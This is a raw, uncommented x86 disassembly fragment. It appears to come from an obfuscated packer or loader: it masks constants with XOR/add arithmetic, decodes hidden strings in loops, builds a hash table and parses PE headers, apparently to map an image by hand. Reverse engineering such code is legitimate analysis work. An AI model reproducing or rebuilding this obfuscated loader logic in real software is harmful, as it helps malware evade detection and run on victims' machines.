  414a6b:	mov    DWORD PTR [ebp-0x20],edi
  414a6e:	mov    edi,DWORD PTR [esi+0x14]
  414a71:	add    ecx,eax
  414a73:	add    edx,eax
  414a75:	mov    DWORD PTR [ebp-0xc],ecx
  414a78:	mov    DWORD PTR [ebp-0x1c],edx
  414a7b:	mov    DWORD PTR [ebp-0x8],edi
  414a7e:	cmp    edi,ebx
  414a80:	ja     0x414a85
  414a82:	mov    DWORD PTR [ebp-0x8],ebx
  414a85:	xor    ebx,ebx
  414a87:	mov    DWORD PTR [ebp-0x18],ebx
  414a8a:	cmp    DWORD PTR [ebp-0x8],ebx
  414a8d:	jbe    0x414afd
  414a8f:	jmp    0x414a94
  414a91:	mov    edx,DWORD PTR [ebp-0x1c]
  414a94:	mov    edi,DWORD PTR [ebp-0x20]
  414a97:	movzx  edi,WORD PTR [edi+ebx*2]
  414a9b:	cmp    ebx,DWORD PTR [esi+0x18]
  414a9e:	jae    0x414afd
  414aa0:	cmp    edi,DWORD PTR [esi+0x14]
  414aa3:	jae    0x414afd
  414aa5:	mov    ebx,DWORD PTR [edx+ebx*4]
  414aa8:	mov    edx,DWORD PTR [ebp+0x8]
  414aab:	mov    edi,DWORD PTR [ecx+edi*4]
  414aae:	mov    DWORD PTR [ebp-0x4],edx
  414ab1:	lea    edx,[ebp-0x50]
  414ab4:	add    ebx,eax
  414ab6:	add    edi,eax
  414ab8:	sub    edx,DWORD PTR [ebp+0x8]
  414abb:	mov    DWORD PTR [ebp-0x14],0xb
  414ac2:	mov    DWORD PTR [ebp-0x24],edx
  414ac5:	mov    edx,DWORD PTR [ebp-0x4]
  414ac8:	cmp    DWORD PTR [edx],0x0
  414acb:	jne    0x414ae8
  414acd:	mov    eax,DWORD PTR [ebp-0x24]
  414ad0:	push   DWORD PTR [eax+edx*1]
  414ad3:	push   ebx
  414ad4:	call   0x4148cf
  414ad9:	mov    ecx,DWORD PTR [ebp-0xc]
  414adc:	test   eax,eax
  414ade:	je     0x414ae5
  414ae0:	mov    eax,DWORD PTR [ebp-0x4]
  414ae3:	mov    DWORD PTR [eax],edi
  414ae5:	mov    eax,DWORD PTR [ebp-0x10]
  414ae8:	add    DWORD PTR [ebp-0x4],0x4
  414aec:	dec    DWORD PTR [ebp-0x14]
  414aef:	jne    0x414ac5
  414af1:	mov    ebx,DWORD PTR [ebp-0x18]
  414af4:	inc    ebx
  414af5:	mov    DWORD PTR [ebp-0x18],ebx
  414af8:	cmp    ebx,DWORD PTR [ebp-0x8]
  414afb:	jb     0x414a91
  414afd:	pop    esi
  414afe:	pop    ebx
  414aff:	pop    edi
  414b00:	leave  
  414b01:	ret    0x4
  414b04:	push   ebp
  414b05:	mov    ebp,esp
  414b07:	mov    eax,DWORD PTR [ebp+0x8]
  414b0a:	push   esi
  414b0b:	push   DWORD PTR [eax+0x1d8]
  414b11:	lea    esi,[eax+0x198]
  414b17:	mov    eax,DWORD PTR [ebp+0x8]
  414b1a:	call   0x4149b4
  414b1f:	mov    ecx,DWORD PTR [esi]
  414b21:	mov    DWORD PTR [ecx],eax
  414b23:	mov    eax,DWORD PTR [esi]
  414b25:	xor    ecx,ecx
  414b27:	cmp    DWORD PTR [eax],ecx
  414b29:	pop    esi
  414b2a:	setne  cl
  414b2d:	mov    eax,ecx
  414b2f:	pop    ebp
  414b30:	ret    0x4
  414b33:	mov    ecx,DWORD PTR [edi+0x188]
  414b39:	push   ebx
  414b3a:	jmp    0x414b4f
  414b3c:	xor    eax,0x8a89
  414b41:	add    eax,0x3b4c
  414b46:	mov    WORD PTR [ecx],ax
  414b49:	add    ecx,0x2
  414b4c:	add    edx,0x2
  414b4f:	movzx  eax,WORD PTR [edx]
  414b52:	mov    ebx,0x4e3d
  414b57:	cmp    ax,bx
  414b5a:	jne    0x414b3c
  414b5c:	xor    eax,eax
  414b5e:	mov    WORD PTR [ecx],ax
  414b61:	mov    eax,DWORD PTR [edi+0x188]
  414b67:	pop    ebx
  414b68:	ret    
  414b69:	push   edi
  414b6a:	mov    edi,eax
  414b6c:	mov    eax,DWORD PTR [esi+0x188]
  414b72:	shl    edi,0x6
  414b75:	add    eax,edi
  414b77:	jmp    0x414b83
  414b79:	xor    cl,0x71
  414b7c:	sub    cl,0xb
  414b7f:	mov    BYTE PTR [eax],cl
  414b81:	inc    eax
  414b82:	inc    edx
  414b83:	mov    cl,BYTE PTR [edx]
  414b85:	cmp    cl,0x7a
  414b88:	jne    0x414b79
  414b8a:	mov    BYTE PTR [eax],0x0
  414b8d:	mov    eax,DWORD PTR [esi+0x188]
  414b93:	add    eax,edi
  414b95:	pop    edi
  414b96:	ret    
  414b97:	push   ebp
  414b98:	mov    ebp,esp
  414b9a:	sub    esp,0x38
  414b9d:	push   ebx
  414b9e:	mov    ebx,0xf89c85b5
  414ba3:	mov    DWORD PTR [ebp-0x4],ebx
  414ba6:	lea    eax,[ebx-0x3]
  414ba9:	push   esi
  414baa:	mov    DWORD PTR [ebp-0x24],eax
  414bad:	mov    ecx,DWORD PTR [ebp-0x4]
  414bb0:	mov    edx,DWORD PTR [ebp+0x8]
  414bb3:	mov    esi,0x7510896
  414bb8:	push   edi
  414bb9:	xor    ecx,esi
  414bbb:	mov    edi,0x3272dd
  414bc0:	add    ecx,edi
  414bc2:	cmp    edx,ecx
  414bc4:	je     0x414d32
  414bca:	mov    ecx,DWORD PTR [ebp-0x4]
  414bcd:	mov    edx,DWORD PTR [ebp+0xc]
  414bd0:	xor    ecx,esi
  414bd2:	add    ecx,edi
  414bd4:	cmp    edx,ecx
  414bd6:	je     0x414d32
  414bdc:	mov    ecx,DWORD PTR [ebp+0x10]
  414bdf:	mov    DWORD PTR [ebp-0x18],ecx
  414be2:	mov    ecx,DWORD PTR [ebp+0xc]
  414be5:	mov    DWORD PTR [ebp-0x14],ecx
  414be8:	mov    ecx,DWORD PTR [ebp+0x8]
  414beb:	mov    DWORD PTR [ebp-0x1c],0xf89c8508
  414bf2:	mov    DWORD PTR [ebp-0x20],eax
  414bf5:	mov    DWORD PTR [ebp-0x10],ebx
  414bf8:	mov    DWORD PTR [ebp+0xc],eax
  414bfb:	mov    DWORD PTR [ebp+0x10],0xf89c85b3
  414c02:	mov    eax,DWORD PTR [ebp+0xc]
  414c05:	mov    DWORD PTR [ebp-0xc],ecx
  414c08:	xor    eax,esi
  414c0a:	mov    ecx,0xffcd8d23
  414c0f:	sub    ecx,eax
  414c11:	add    ecx,DWORD PTR [ebp-0x14]
  414c14:	mov    DWORD PTR [ebp+0x8],ecx
  414c17:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  414c1e:	jmp    0x414d22
  414c23:	mov    eax,DWORD PTR [ebp+0xc]
  414c26:	mov    ecx,DWORD PTR [ebp+0xc]
  414c29:	xor    eax,esi
  414c2b:	xor    ecx,esi
  414c2d:	lea    ecx,[eax+ecx*1+0x64e5ba]
  414c34:	mov    eax,DWORD PTR [ebp+0x8]
  414c37:	xor    edx,edx
  414c39:	div    ecx
  414c3b:	mov    eax,DWORD PTR [ebp+0x10]
  414c3e:	mov    ecx,DWORD PTR [ebp+0xc]
  414c41:	xor    eax,esi
  414c43:	xor    ecx,esi
  414c45:	sub    eax,ecx
  414c47:	cmp    edx,eax
  414c49:	jne    0x414cde
  414c4f:	mov    eax,DWORD PTR [ebp+0x8]
  414c52:	add    eax,DWORD PTR [ebp-0xc]
  414c55:	mov    dl,BYTE PTR [eax]
  414c57:	mov    eax,DWORD PTR [ebp-0x10]
  414c5a:	mov    ecx,DWORD PTR [ebp-0x8]
  414c5d:	xor    eax,esi
  414c5f:	xor    ecx,esi
  414c61:	add    eax,edi
  414c63:	add    ecx,edi
  414c65:	cmp    eax,ecx
  414c67:	jae    0x414caf
  414c69:	lea    ecx,[eax-0x3272dd]
  414c6f:	mov    DWORD PTR [ebp-0x4],ecx
  414c72:	mov    ebx,DWORD PTR [ebp-0x4]
  414c75:	xor    ebx,esi
  414c77:	add    ebx,0x7f55d8f3
  414c7d:	lea    ecx,[ebp+eax*4-0x38]
  414c81:	mov    DWORD PTR [ecx],ebx
  414c83:	mov    ebx,DWORD PTR [ecx]
  414c85:	cmp    ebx,0x244ecbd0
  414c8b:	jbe    0x414c95
  414c8d:	add    DWORD PTR [ecx],0x405fc11
  414c93:	jmp    0x414c9b
  414c95:	add    DWORD PTR [ecx],0xfdaf43ef
  414c9b:	mov    ecx,DWORD PTR [ebp-0x8]
  414c9e:	xor    ecx,esi
  414ca0:	inc    eax
  414ca1:	inc    DWORD PTR [ebp-0x4]
  414ca4:	add    ecx,edi
  414ca6:	cmp    eax,ecx
  414ca8:	jb     0x414c72
  414caa:	mov    ebx,0xf89c85b5
  414caf:	mov    eax,DWORD PTR [ebp-0x18]
  414cb2:	test   eax,eax
  414cb4:	jne    0x414cbe
  414cb6:	xor    dl,0x71
  414cb9:	sub    dl,0xb
  414cbc:	jmp    0x414cd4
  414cbe:	mov    eax,DWORD PTR [ebp-0x1c]
  414cc1:	xor    al,0x96
  414cc3:	mov    cl,0x23
  414cc5:	sub    cl,al
  414cc7:	add    dl,cl
  414cc9:	mov    ecx,DWORD PTR [ebp-0x20]
  414ccc:	xor    cl,0x96
  414ccf:	sub    cl,0x23
  414cd2:	ror    dl,cl
  414cd4:	xor    eax,eax
  414cd6:	mov    eax,DWORD PTR [ebp+0x8]
  414cd9:	add    eax,DWORD PTR [ebp-0xc]
  414cdc:	mov    BYTE PTR [eax],dl
  414cde:	mov    eax,DWORD PTR [ebp+0x8]
  414ce1:	mov    ecx,DWORD PTR [ebp-0x10]
  414ce4:	sub    eax,edi
  414ce6:	xor    eax,esi
  414ce8:	cmp    eax,ecx
  414cea:	jne    0x414d10
  414cec:	mov    eax,DWORD PTR [ebp+0x10]
  414cef:	mov    ecx,DWORD PTR [ebp+0xc]
  414cf2:	xor    eax,esi
  414cf4:	xor    ecx,esi
  414cf6:	sub    eax,ecx
  414cf8:	sub    eax,edi
  414cfa:	xor    eax,esi
  414cfc:	mov    DWORD PTR [ebp+0x10],eax
  414cff:	mov    eax,DWORD PTR [ebp+0xc]
  414d02:	xor    eax,esi
  414d04:	mov    ecx,0xffcd8d23
  414d09:	sub    ecx,eax
  414d0b:	add    ecx,DWORD PTR [ebp-0x14]
  414d0e:	jmp    0x414d1f
  414d10:	mov    eax,DWORD PTR [ebp+0xc]
  414d13:	xor    eax,esi
  414d15:	mov    ecx,0xffcd8d23
  414d1a:	sub    ecx,eax
  414d1c:	add    ecx,DWORD PTR [ebp+0x8]
  414d1f:	mov    DWORD PTR [ebp+0x8],ecx
  414d22:	mov    eax,DWORD PTR [ebp+0x10]
  414d25:	cmp    eax,ebx
  414d27:	jne    0x414c23
  414d2d:	mov    eax,DWORD PTR [ebp-0x24]
  414d30:	jmp    0x414d35
  414d32:	mov    eax,DWORD PTR [ebp-0x4]
  414d35:	xor    eax,esi
  414d37:	add    eax,edi
  414d39:	pop    edi
  414d3a:	pop    esi
  414d3b:	pop    ebx
  414d3c:	leave  
  414d3d:	ret    0xc
  414d40:	push   ebp
  414d41:	mov    ebp,esp
  414d43:	sub    esp,0x14
  414d46:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  414d4d:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  414d54:	mov    eax,DWORD PTR [ebx]
  414d56:	mov    DWORD PTR [ebp-0x8],eax
  414d59:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  414d60:	push   esi
  414d61:	push   edi
  414d62:	mov    DWORD PTR [ebp-0x14],0xead718d5
  414d69:	mov    edi,DWORD PTR [ebp-0x4]
  414d6c:	mov    ecx,DWORD PTR [ebp-0x10]
  414d6f:	mov    eax,0x7510896
  414d74:	xor    edi,eax
  414d76:	mov    edx,0x3272dd
  414d7b:	xor    ecx,eax
  414d7d:	add    edi,edx
  414d7f:	add    ecx,edx
  414d81:	imul   edi,ecx
  414d84:	jmp    0x414dcc
  414d86:	mov    ecx,DWORD PTR [ebp-0x8]
  414d89:	mov    esi,DWORD PTR [ebp-0x4]
  414d8c:	xor    ecx,eax
  414d8e:	xor    esi,eax
  414d90:	add    ecx,edx
  414d92:	add    esi,edx
  414d94:	test   esi,ecx
  414d96:	mov    esi,DWORD PTR [ebp-0x8]
  414d99:	mov    ecx,DWORD PTR [ebp-0x4]
  414d9c:	je     0x414db3
  414d9e:	xor    ecx,eax
  414da0:	xor    esi,eax
  414da2:	add    ecx,edx
  414da4:	add    esi,edx
  414da6:	shr    esi,cl
  414da8:	mov    ecx,DWORD PTR [ebp-0x14]
  414dab:	xor    ecx,eax
  414dad:	add    ecx,edx
  414daf:	xor    esi,ecx
  414db1:	jmp    0x414dbd
  414db3:	xor    esi,eax
  414db5:	xor    ecx,eax
  414db7:	add    esi,edx
  414db9:	add    ecx,edx
  414dbb:	shr    esi,cl
  414dbd:	mov    DWORD PTR [ebp-0x8],esi
  414dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  414dc3:	xor    ecx,eax
  414dc5:	lea    edi,[edi+ecx*1+0x3272dd]
  414dcc:	mov    ecx,DWORD PTR [ebp-0xc]
  414dcf:	mov    esi,DWORD PTR [ebp-0x4]
  414dd2:	xor    esi,eax
  414dd4:	xor    ecx,eax
  414dd6:	sub    ecx,esi
  414dd8:	cmp    edi,ecx
  414dda:	jbe    0x414d86
  414ddc:	mov    eax,DWORD PTR [ebp-0x8]
  414ddf:	pop    edi
  414de0:	mov    DWORD PTR [ebx],eax
  414de2:	mov    eax,DWORD PTR [ebp-0x8]
  414de5:	pop    esi
  414de6:	leave  
  414de7:	ret    
  414de8:	push   ebp
  414de9:	mov    ebp,esp
  414deb:	sub    esp,0x420
  414df1:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  414df8:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  414dff:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  414e06:	push   ebx
  414e07:	mov    DWORD PTR [ebp-0x1c],0xf89c85b4
  414e0e:	mov    eax,DWORD PTR [ebp-0x14]
  414e11:	push   esi
  414e12:	mov    esi,0x7510896
  414e17:	push   edi
  414e18:	xor    eax,esi
  414e1a:	mov    edi,0x3272dd
  414e1f:	add    eax,edi
  414e21:	mov    DWORD PTR [ebp-0x8],eax
  414e24:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  414e2b:	mov    DWORD PTR [ebp-0x4],0xead718d5
  414e32:	mov    DWORD PTR [ebp-0x10],0x8
  414e39:	mov    ecx,ecx
  414e3b:	mov    eax,DWORD PTR [ebp-0xc]
  414e3e:	mov    ecx,DWORD PTR [ebp-0x14]
  414e41:	xor    eax,esi
  414e43:	xor    ecx,esi
  414e45:	add    eax,edi
  414e47:	add    ecx,edi
  414e49:	imul   eax,ecx
  414e4c:	jmp    0x414e7f
  414e4e:	mov    eax,DWORD PTR [ebp-0x4]
  414e51:	sub    eax,edi
  414e53:	xor    eax,esi
  414e55:	mov    DWORD PTR [ebp-0x8],eax
  414e58:	lea    ebx,[ebp-0x8]
  414e5b:	call   0x414d40
  414e60:	mov    DWORD PTR [ebp-0x8],eax
  414e63:	mov    eax,DWORD PTR [ebp-0x8]
  414e66:	mov    ecx,DWORD PTR [ebp-0x4]
  414e69:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  414e70:	mov    eax,DWORD PTR [ebp-0xc]
  414e73:	mov    ecx,DWORD PTR [ebp-0x4]
  414e76:	xor    eax,esi
  414e78:	lea    eax,[eax+ecx*1+0x3272dd]
  414e7f:	mov    DWORD PTR [ebp-0x4],eax
  414e82:	mov    eax,DWORD PTR [ebp-0x18]
  414e85:	mov    ecx,DWORD PTR [ebp-0xc]
  414e88:	xor    ecx,esi
  414e8a:	xor    eax,esi
  414e8c:	sub    eax,ecx
  414e8e:	mov    ecx,DWORD PTR [ebp-0x4]
  414e91:	cmp    ecx,eax
  414e93:	jbe    0x414e4e
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	xor    eax,esi
  414e9a:	add    eax,edi
  414e9c:	mov    DWORD PTR [ebp-0x8],eax
  414e9f:	mov    DWORD PTR [ebp-0x18],0xf89c86b4
  414ea6:	mov    ebx,ebx
  414ea8:	jmp    0x414f0b
  414eaa:	mov    ecx,DWORD PTR [ebp-0x20]
  414ead:	mov    eax,DWORD PTR [ebp-0x8]
  414eb0:	xor    ecx,esi
  414eb2:	add    ecx,edi
  414eb4:	shr    eax,cl
  414eb6:	mov    DWORD PTR [ebp-0x4],eax
  414eb9:	mov    eax,DWORD PTR [ebp+0x8]
  414ebc:	mov    cl,BYTE PTR [eax]
  414ebe:	mov    BYTE PTR [ebp+0xb],cl
  414ec1:	mov    cl,BYTE PTR [ebp+0xb]
  414ec4:	mov    edx,DWORD PTR [ebp-0x8]
  414ec7:	movzx  ecx,cl
  414eca:	xor    ecx,edx
  414ecc:	mov    DWORD PTR [ebp+0x8],ecx
  414ecf:	mov    ecx,DWORD PTR [ebp-0x18]
  414ed2:	mov    edx,DWORD PTR [ebp+0x8]
  414ed5:	xor    ecx,esi
  414ed7:	add    ecx,edi
  414ed9:	and    ecx,edx
  414edb:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  414ee2:	mov    edx,DWORD PTR [ebp-0x4]
  414ee5:	xor    ecx,edx
  414ee7:	mov    DWORD PTR [ebp-0x8],ecx
  414eea:	mov    ecx,DWORD PTR [ebp-0xc]
  414eed:	xor    ecx,esi
  414eef:	lea    eax,[eax+ecx*1+0x3272dd]
  414ef6:	mov    DWORD PTR [ebp+0x8],eax
  414ef9:	mov    eax,DWORD PTR [ebp-0xc]
  414efc:	xor    eax,esi
  414efe:	mov    ecx,0xffcd8d23
  414f03:	sub    ecx,eax
  414f05:	add    ecx,DWORD PTR [ebp-0x10]
  414f08:	mov    DWORD PTR [ebp-0x10],ecx
  414f0b:	mov    eax,DWORD PTR [ebp-0x14]
  414f0e:	mov    ecx,DWORD PTR [ebp-0x10]
  414f11:	xor    eax,esi
  414f13:	add    eax,edi
  414f15:	cmp    ecx,eax
  414f17:	jne    0x414eaa
  414f19:	mov    eax,DWORD PTR [ebp-0x1c]
  414f1c:	mov    ecx,DWORD PTR [ebp-0x8]
  414f1f:	xor    eax,esi
  414f21:	add    eax,edi
  414f23:	pop    edi
  414f24:	pop    esi
  414f25:	xor    eax,ecx
  414f27:	pop    ebx
  414f28:	leave  
  414f29:	ret    0x4
  414f2c:	push   ebp
  414f2d:	mov    ebp,esp
  414f2f:	mov    eax,DWORD PTR [ebp+0x1c]
  414f32:	mov    ecx,DWORD PTR [ebp+0x8]
  414f35:	mov    edx,DWORD PTR [ebp+0x10]
  414f38:	mov    eax,DWORD PTR [eax+0x190]
  414f3e:	mov    eax,DWORD PTR [eax]
  414f40:	sub    esp,0x64
  414f43:	push   ebx
  414f44:	push   esi
  414f45:	push   edi
  414f46:	mov    edi,0x7510896
  414f4b:	xor    ecx,edi
  414f4d:	mov    ebx,0x3272dd
  414f52:	add    ecx,ebx
  414f54:	cmp    ecx,edx
  414f56:	jne    0x414f67
  414f58:	or     DWORD PTR ds:0x3750c3f,0x4263eb0c
  414f62:	jmp    0x415464
  414f67:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6a:	mov    esi,DWORD PTR [ebp+0x14]
  414f6d:	mov    edx,DWORD PTR [esi]
  414f6f:	xor    ecx,edi
  414f71:	add    ecx,ebx
  414f73:	cmp    edx,ecx
  414f75:	je     0x41541f
  414f7b:	mov    ecx,DWORD PTR [ebp+0x1c]
  414f7e:	mov    DWORD PTR [ebp-0x1c],eax
  414f81:	mov    DWORD PTR [ebp+0x1c],ecx
  414f84:	mov    ecx,DWORD PTR [ebp+0x18]
  414f87:	mov    eax,DWORD PTR [esi]
  414f89:	mov    DWORD PTR [ebp-0x20],eax
  414f8c:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  414f93:	mov    edx,0xf89c85b2
  414f98:	mov    DWORD PTR [ebp-0x8],edx
  414f9b:	mov    eax,DWORD PTR [ebp+0x1c]
  414f9e:	mov    DWORD PTR [ebp+0x1c],eax
  414fa1:	mov    eax,DWORD PTR [ebp+0x1c]
  414fa4:	mov    eax,DWORD PTR [eax+0x190]
  414faa:	mov    eax,DWORD PTR [eax]
  414fac:	mov    DWORD PTR [ebp-0x24],ecx
  414faf:	mov    ecx,DWORD PTR [ebp+0x1c]
  414fb2:	mov    ecx,DWORD PTR [ecx+0x190]
  414fb8:	mov    ecx,DWORD PTR [ecx]
  414fba:	add    ecx,DWORD PTR [eax+0x3c]
  414fbd:	mov    DWORD PTR [ebp+0x10],ecx
  414fc0:	mov    eax,DWORD PTR [ebp+0x8]
  414fc3:	xor    eax,edi
  414fc5:	add    eax,ebx
  414fc7:	mov    DWORD PTR [ebp-0x4],eax
  414fca:	mov    eax,DWORD PTR [ebp+0x8]
  414fcd:	xor    eax,edi
  414fcf:	add    eax,ebx
  414fd1:	mov    DWORD PTR [ebp+0x18],eax
  414fd4:	mov    eax,DWORD PTR [ebp+0x10]
  414fd7:	mov    eax,DWORD PTR [eax+0x50]
  414fda:	sub    eax,0xc
  414fdd:	mov    DWORD PTR [ebp-0x28],eax
  414fe0:	mov    eax,DWORD PTR [ebp+0x10]
  414fe3:	mov    eax,DWORD PTR [eax+0x38]
  414fe6:	mov    ecx,DWORD PTR [ebp+0x10]
  414fe9:	dec    eax
  414fea:	test   DWORD PTR [ecx+0x54],eax
  414fed:	mov    eax,DWORD PTR [ebp+0x10]
  414ff0:	je     0x41500a
  414ff2:	mov    eax,DWORD PTR [eax+0x38]
  414ff5:	mov    ecx,DWORD PTR [ebp+0x10]
  414ff8:	mov    ecx,DWORD PTR [ecx+0x54]
  414ffb:	dec    eax
  414ffc:	not    eax
  414ffe:	and    ecx,eax
  415000:	mov    eax,DWORD PTR [ebp+0x10]
  415003:	mov    eax,DWORD PTR [eax+0x38]
  415006:	add    eax,ecx
  415008:	jmp    0x41500d
  41500a:	mov    eax,DWORD PTR [eax+0x54]
  41500d:	mov    DWORD PTR [ebp+0x1c],eax
  415010:	mov    eax,DWORD PTR [ebp+0x8]
  415013:	xor    eax,edi
  415015:	add    eax,ebx
  415017:	mov    DWORD PTR [ebp+0x18],eax
  41501a:	mov    eax,DWORD PTR [ebp+0x8]
  41501d:	xor    eax,edi
  41501f:	add    eax,ebx
  415021:	mov    DWORD PTR [ebp+0x18],eax
  415024:	mov    eax,DWORD PTR [ebp+0x8]
  415027:	mov    ecx,DWORD PTR [ebp-0x24]
  41502a:	xor    eax,edi
  41502c:	add    eax,ebx
  41502e:	mov    DWORD PTR [ecx],eax
  415030:	mov    DWORD PTR [ebp+0x18],edx
  415033:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  41503a:	mov    DWORD PTR [ebp+0x18],0xf89c85b0
  415041:	mov    DWORD PTR [ebp+0x18],0xf89c85b1
  415048:	mov    eax,DWORD PTR [ebp-0x8]
  41504b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41504e:	xor    eax,edi
  415050:	add    eax,ebx
  415052:	imul   eax,ecx
  415055:	mov    ecx,DWORD PTR [ebp+0x8]
  415058:	mov    edx,DWORD PTR [ebp-0x28]
  41505b:	xor    ecx,edi
  41505d:	lea    ecx,[ecx+edx*1+0x3272dd]
  415064:	cmp    eax,ecx
  415066:	jae    0x415418
  41506c:	mov    eax,DWORD PTR [ebp+0x8]
  41506f:	xor    eax,edi
  415071:	add    eax,ebx
  415073:	mov    DWORD PTR [ebp+0x18],eax
  415076:	mov    eax,DWORD PTR [ebp+0x1c]
  415079:	add    eax,DWORD PTR [ebp-0x1c]
  41507c:	mov    DWORD PTR [ebp-0x4],eax
  41507f:	push   DWORD PTR [ebp-0x4]
  415082:	mov    esi,DWORD PTR [ebp-0x1c]
  415085:	mov    ecx,DWORD PTR [ebp+0x10]
  415088:	call   0x41416e
  41508d:	mov    DWORD PTR [ebp+0xc],eax
  415090:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  415097:	mov    eax,DWORD PTR [ebp-0x18]
  41509a:	xor    eax,edi
  41509c:	add    eax,ebx
  41509e:	push   eax
  41509f:	lea    eax,[ebp-0x40]
  4150a2:	push   eax
  4150a3:	call   0x414779
  4150a8:	mov    eax,DWORD PTR [ebp+0xc]
  4150ab:	test   eax,eax
  4150ad:	je     0x4150fd
  4150af:	mov    eax,DWORD PTR [ebp-0x18]
  4150b2:	xor    eax,edi
  4150b4:	add    eax,ebx
  4150b6:	push   eax
  4150b7:	push   DWORD PTR [ebp+0xc]
  4150ba:	lea    eax,[ebp-0x40]
  4150bd:	push   eax
  4150be:	call   0x414620
  4150c3:	mov    eax,DWORD PTR [ebp-0x4]
  4150c6:	mov    DWORD PTR [ebp-0x18],eax
  4150c9:	mov    eax,DWORD PTR [ebp-0x18]
  4150cc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4150cf:	sub    eax,ecx
  4150d1:	mov    DWORD PTR [ebp-0x18],eax
  4150d4:	mov    eax,DWORD PTR [ebp+0xc]
  4150d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4150da:	mov    eax,DWORD PTR [eax+0x10]
  4150dd:	add    eax,DWORD PTR [ecx+0xc]
  4150e0:	mov    ecx,DWORD PTR [ebp-0x18]
  4150e3:	cmp    ecx,eax
  4150e5:	jb     0x4150fd
  4150e7:	mov    eax,DWORD PTR [ebp+0xc]
  4150ea:	mov    eax,DWORD PTR [eax+0xc]
  4150ed:	mov    ecx,DWORD PTR [ebp+0xc]
  4150f0:	add    eax,DWORD PTR [ecx+0x8]
  4150f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4150f6:	sub    eax,ecx
  4150f8:	jmp    0x4153eb
  4150fd:	push   0xc
  4150ff:	push   DWORD PTR [ebp-0x4]
  415102:	lea    eax,[ebp-0x4c]
  415105:	push   eax
  415106:	call   0x414620
  41510b:	mov    eax,0xf89c85b5
  415110:	mov    DWORD PTR [ebp-0x2c],eax
  415113:	mov    DWORD PTR [ebp-0x30],0xf89c85b2
  41511a:	mov    DWORD PTR [ebp-0x34],0xf89c85b3
  415121:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  415128:	lea    ecx,[ebp-0x2c]
  41512b:	mov    DWORD PTR [ebp-0xc],ecx
  41512e:	lea    ecx,[ebp-0x30]
  415131:	mov    DWORD PTR [ebp-0x10],ecx
  415134:	lea    ecx,[ebp-0x34]
  415137:	mov    DWORD PTR [ebp+0xc],ecx
  41513a:	lea    ecx,[ebp-0x38]
  41513d:	mov    DWORD PTR [ebp-0x14],ecx
  415140:	mov    ecx,DWORD PTR [ebp+0x8]
  415143:	xor    ecx,edi
  415145:	add    ecx,ebx
  415147:	mov    DWORD PTR [ebp-0x18],ecx
  41514a:	jmp    0x415346
  41514f:	cmp    eax,0xf89c85b3
  415154:	je     0x415358
  41515a:	mov    ecx,DWORD PTR [ebp-0x8]
  41515d:	xor    ecx,edi
  41515f:	mov    esi,eax
  415161:	add    ecx,ebx
  415163:	mov    DWORD PTR [ebp+0x18],ecx
  415166:	mov    eax,DWORD PTR [ebp-0x18]
  415169:	xor    esi,edi
  41516b:	lea    eax,[eax+esi*1+0x3272dd]
  415172:	mov    DWORD PTR [ebp-0x18],eax
  415175:	mov    eax,DWORD PTR [ebp-0x8]
  415178:	mov    ecx,DWORD PTR [ebp-0x18]
  41517b:	xor    eax,edi
  41517d:	add    eax,ebx
  41517f:	cmp    ecx,eax
  415181:	jne    0x415196
  415183:	mov    eax,DWORD PTR [ebp+0x8]
  415186:	xor    eax,edi
  415188:	add    eax,ebx
  41518a:	push   eax
  41518b:	push   0xc
  41518d:	lea    eax,[ebp-0x4c]
  415190:	push   eax
  415191:	call   0x414b97
  415196:	mov    eax,DWORD PTR [ebp-0xc]
  415199:	mov    eax,DWORD PTR [eax]
  41519b:	xor    eax,edi
  41519d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151a7:	xor    ecx,edi
  4151a9:	movzx  eax,al
  4151ac:	add    ecx,ebx
  4151ae:	cmp    eax,ecx
  4151b0:	je     0x41532e
  4151b6:	mov    eax,DWORD PTR [ebp-0x10]
  4151b9:	mov    eax,DWORD PTR [eax]
  4151bb:	xor    eax,edi
  4151bd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151c7:	xor    ecx,edi
  4151c9:	movzx  eax,al
  4151cc:	add    ecx,ebx
  4151ce:	cmp    eax,ecx
  4151d0:	je     0x41532e
  4151d6:	mov    eax,DWORD PTR [ebp+0xc]
  4151d9:	mov    eax,DWORD PTR [eax]
  4151db:	xor    eax,edi
  4151dd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151e7:	xor    ecx,edi
  4151e9:	movzx  eax,al
  4151ec:	add    ecx,ebx
  4151ee:	cmp    eax,ecx
  4151f0:	je     0x41532e
  4151f6:	mov    eax,DWORD PTR [ebp-0x14]
  4151f9:	mov    eax,DWORD PTR [eax]
  4151fb:	xor    eax,edi
  4151fd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415204:	mov    ecx,DWORD PTR [ebp+0x8]
  415207:	xor    ecx,edi
  415209:	movzx  eax,al
  41520c:	add    ecx,ebx
  41520e:	cmp    eax,ecx
  415210:	je     0x41532e
  415216:	mov    eax,DWORD PTR [ebp-0x10]
  415219:	mov    eax,DWORD PTR [eax]
  41521b:	xor    eax,edi
  41521d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415224:	mov    ecx,DWORD PTR [ebp-0xc]
  415227:	mov    ecx,DWORD PTR [ecx]
  415229:	xor    ecx,edi
